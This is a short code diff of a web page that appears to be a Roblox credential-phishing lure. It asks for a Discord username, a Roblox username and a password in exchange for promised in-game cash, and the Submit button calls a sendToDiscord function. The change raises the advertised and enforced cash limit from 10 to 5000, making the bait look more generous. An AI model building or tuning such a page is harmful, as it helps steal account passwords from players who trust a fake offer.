@@ -100,7 +100,7 @@
         <input type="text" id="discord" placeholder="Enter Discord Username" required>
         <input type="text" id="username" placeholder="Roblox Username" required>
         <input type="password" id="password" placeholder="Password" required>
-        <input type="number" id="number" placeholder="Enter a Cash to be Loaded (Max 5k)" max="10" required>
+        <input type="number" id="number" placeholder="Enter a Cash to be Loaded (Max 5000)" max="5000" required>
         <button type="button" onclick="sendToDiscord()">Submit</button>
     </div>
 
@@ -132,7 +132,7 @@
         const number = parseInt(document.getElementById("number").value);
 
         // Check if "Cash" exceeds max of 10
-        if (number > 10) {
+        if (number > 5000) {
             showNotification("Cash Max", "#f44336");
             return;
         }
